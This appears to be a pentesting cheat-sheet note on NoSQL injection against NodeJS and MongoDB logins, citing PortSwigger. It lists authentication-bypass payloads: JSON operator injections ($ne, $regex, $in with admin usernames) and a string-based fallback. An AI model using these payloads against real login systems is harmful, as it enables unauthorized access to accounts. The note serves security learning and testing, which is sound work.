Common with NodeJS applications in conjunction with MongoDB databases.

### NodeJS + MongoDB
#### Authentication Bypass - [PortSwigger](https://portswigger.net/web-security/nosql-injection)
Within Burp change the `Content-Type` to `json`
```http
Content-Type: application/json
```
Change the parameter format to `json`
```json
{"username":"admin", "password":"admin"}
```
We can change the username value to `{"$ne":""}` and try changing the password following that
```json
{"username":{"$ne":""}, "password":"admin"}

{"username":{"$ne":""}, "password":{"$ne":""}}
```
We can try regexing a valid username like so
```json
{"username":{"$regex":"admin.*"}, "password":{"$ne":""}}
```
We can even try using a list
```json
{"username":{"$in":["admin","administrator","superadmin"]}, "password":{"$ne":""}}
```
If that dont work try this
```php
username=admin'||'1'=='1&password=admin
```